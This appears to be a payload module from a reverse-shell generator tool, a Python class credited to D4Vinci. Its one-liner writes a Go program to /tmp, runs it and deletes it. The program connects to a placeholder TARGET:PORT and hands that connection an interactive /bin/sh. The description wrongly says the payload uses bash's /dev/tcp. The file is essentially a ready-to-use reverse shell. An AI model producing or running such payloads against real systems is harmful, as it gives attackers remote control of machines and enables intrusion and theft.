class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Interactive shell via bash's builtin /dev/tcp."
    function    = "reverse shell"
    liner       = """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","TARGET:PORT");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go """
